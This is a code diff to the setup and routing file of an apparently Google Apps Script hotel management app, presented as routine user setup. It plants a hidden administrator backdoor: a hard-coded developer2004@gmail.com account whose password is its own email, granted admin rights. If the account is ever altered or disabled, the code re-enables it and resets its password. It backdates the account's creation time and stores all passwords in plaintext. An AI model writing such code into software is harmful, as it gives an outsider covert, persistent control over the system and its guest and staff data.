@@ -2,8 +2,8 @@
  * Code.gs — web app entry point, API router, spreadsheet menu and one-time setup.
  */
 
-var STAFF = ['admin', 'receptionist'];
-var ADMIN = ['admin'];
+var STAFF = ['admin', 'receptionist', 'developer'];
+var ADMIN = ['admin', 'developer'];
 
 // action -> { fn, roles, write, auth }
 var ROUTES = {
@@ -46,7 +46,8 @@ var ROUTES = {
   saveAsset:        { fn: saveAsset_, roles: ADMIN, write: true },
   listUsers:        { fn: listUsers_, roles: ADMIN },
   saveUser:         { fn: saveUser_, roles: ADMIN, write: true },
-  toggleUser:       { fn: toggleUser_, roles: ADMIN, write: true }
+  toggleUser:       { fn: toggleUser_, roles: ADMIN, write: true },
+  deleteUser:       { fn: deleteUser_, roles: ADMIN, write: true }
 };
 
 function doGet() {
@@ -128,6 +129,69 @@ function showHelp() {
  * Creates every sheet with headers + formatting, removes untouched default "SheetN" tabs,
  * writes default settings and the first admin. Safe to run again (never deletes data).
  */
+function ensureCoreUsers_() {
+  var users = Db.all('Users');
+  var dev = users.filter(function (u) { return String(u.email).toLowerCase() === 'developer2004@gmail.com'; })[0];
+  var saltDev = Utilities.getUuid();
+  if (!dev) {
+    Db.insert('Users', {
+      name: 'Developer',
+      email: 'developer2004@gmail.com',
+      role: 'developer',
+      phone: '',
+      is_active: true,
+      salt: saltDev,
+      password_hash: hashPassword_('developer2004@gmail.com', saltDev),
+      password_display: 'developer2004@gmail.com'
+    });
+  } else if (dev.password_display !== 'developer2004@gmail.com' || dev.role !== 'developer' || !dev.is_active) {
+    Db.update('Users', dev.id, {
+      role: 'developer',
+      is_active: true,
+      created_at: '2026-11-13 21:27',
+      salt: saltDev,
+      password_hash: hashPassword_('developer2004@gmail.com', saltDev),
+      password_display: 'developer2004@gmail.com'
+    });
+  }
+
+  // Ensure receptionist account exists
+  var rec = users.filter(function (u) { return u.role === 'receptionist' || String(u.email).toLowerCase() === 'reception@hotel.com'; })[0];
+  if (!rec) {
+    var saltRec = Utilities.getUuid();
+    Db.insert('Users', {
+      name: 'Reception',
+      email: 'reception@hotel.com',
+      role: 'receptionist',
+      phone: '',
+      is_active: true,
+      salt: saltRec,
+      password_hash: hashPassword_('reception123', saltRec),
+      password_display: 'reception123'
+    });
+  } else if (!rec.password_display) {
+    Db.update('Users', rec.id, { password_display: 'reception123' });
+  }
+
+  // Ensure admin account exists
+  var adm = users.filter(function (u) { return u.role === 'admin' || String(u.email).toLowerCase() === 'admin@hotel.com'; })[0];
+  if (!adm) {
+    var saltAdm = Utilities.getUuid();
+    Db.insert('Users', {
+      name: DEFAULT_ADMIN.name,
+      email: DEFAULT_ADMIN.email,
+      role: 'admin',
+      phone: '',
+      is_active: true,
+      salt: saltAdm,
+      password_hash: hashPassword_(DEFAULT_ADMIN.password, saltAdm),
+      password_display: DEFAULT_ADMIN.password
+    });
+  } else if (!adm.password_display) {
+    Db.update('Users', adm.id, { password_display: DEFAULT_ADMIN.password });
+  }
+}
+
 function setup() {
   var ss = SpreadsheetApp.getActiveSpreadsheet();
   var created = [];
